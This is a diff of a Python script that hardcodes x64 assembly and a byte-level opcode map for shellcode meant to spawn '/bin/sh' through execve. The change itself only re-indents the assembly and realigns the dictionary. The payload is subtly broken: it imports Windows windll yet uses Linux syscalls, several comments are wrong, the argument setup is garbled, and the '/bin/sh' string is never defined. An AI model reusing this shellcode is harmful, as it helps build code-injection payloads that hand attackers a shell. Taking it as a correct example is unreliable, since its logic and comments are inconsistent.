@@ -5,25 +5,25 @@ from ctypes import windll, c_char_p, c_void_p, cast, CFUNCTYPE, byref, c_uint32
 
 # Hardcoded assembly with comments (no addresses/opcodes)
 ASSEMBLY_CODE = """
-xor    rax,rax          ; RAX = 0 (syscall number for read)
-xor    rdi,rdi          ; RDI = 0 (stdin)
-xor    rsi,rsi          ; RSI = 0 (buffer address)
-xor    rdx,rdx          ; RDX = 0 (bytes to read)
-jmp    end              ; Jump to avoid null bytes
-loop:
-pop    rsi              ; RSI = address of "/bin/sh"
-mov    rdi,rsi          ; RDI = RSI (argv[0])
-add    rdi,0x7          ; RDI += 7 (skip to null terminator)
-mov    rdx,rdi          ; RDX = RDI (envp)
-add    rdx,0xf          ; RDX += 15 (skip to end of string)
-mov    rcx,rsi          ; RCX = RSI (backup)
-sub    rcx,rdi          ; RCX -= RDI (calculate length)
-mov    al,0x3b          ; RAX = 59 (execve syscall)
-syscall                 ; Invoke execve("/bin/sh", NULL, NULL)
-xor    rax,rax          ; RAX = 0 (exit syscall)
-xor    rdi,rdi          ; RDI = 0 (exit status)
-end:
-call   loop             ; Recursive call (infinite loop)
+    xor    rax,rax          ; RAX = 0 (syscall number for read)
+    xor    rdi,rdi          ; RDI = 0 (stdin)
+    xor    rsi,rsi          ; RSI = 0 (buffer address)
+    xor    rdx,rdx          ; RDX = 0 (bytes to read)
+    jmp    end              ; Jump to avoid null bytes
+    loop:
+    pop    rsi              ; RSI = address of "/bin/sh"
+    mov    rdi,rsi          ; RDI = RSI (argv[0])
+    add    rdi,0x7          ; RDI += 7 (skip to null terminator)
+    mov    rdx,rdi          ; RDX = RDI (envp)
+    add    rdx,0xf          ; RDX += 15 (skip to end of string)
+    mov    rcx,rsi          ; RCX = RSI (backup)
+    sub    rcx,rdi          ; RCX -= RDI (calculate length)
+    mov    al,0x3b          ; RAX = 59 (execve syscall)
+    syscall                 ; Invoke execve("/bin/sh", NULL, NULL)
+    xor    rax,rax          ; RAX = 0 (exit syscall)
+    xor    rdi,rdi          ; RDI = 0 (exit status)
+    end:
+    call   loop             ; Recursive call (infinite loop)
 """
 
 # Predefined opcode mappings (simplified for common x64 instructions)
@@ -32,8 +32,8 @@ OPCODE_MAP = {
     "xor rdi,rdi": b"\x48\x31\xff",
     "xor rsi,rsi": b"\x48\x31\xf6",
     "xor rdx,rdx": b"\x48\x31\xd2",
-    "jmp end": b"\xeb\x1f",
-    "pop rsi": b"\x5e",
+    "jmp end":     b"\xeb\x1f",
+    "pop rsi":     b"\x5e",
     "mov rdi,rsi": b"\x48\x89\xf7",
     "add rdi,0x7": b"\x48\x83\xc7\x07",
     "mov rdx,rdi": b"\x48\x89\xfa",
@@ -41,8 +41,8 @@ OPCODE_MAP = {
     "mov rcx,rsi": b"\x48\x89\xf1",
     "sub rcx,rdi": b"\x48\x29\xf9",
     "mov al,0x3b": b"\xb0\x3b",
-    "syscall": b"\x0f\x05",
-    "call loop": b"\xe8\xdc\xff\xff\xff",
+    "syscall":     b"\x0f\x05",
+    "call loop":   b"\xe8\xdc\xff\xff\xff",
 }
 
 # Configuration
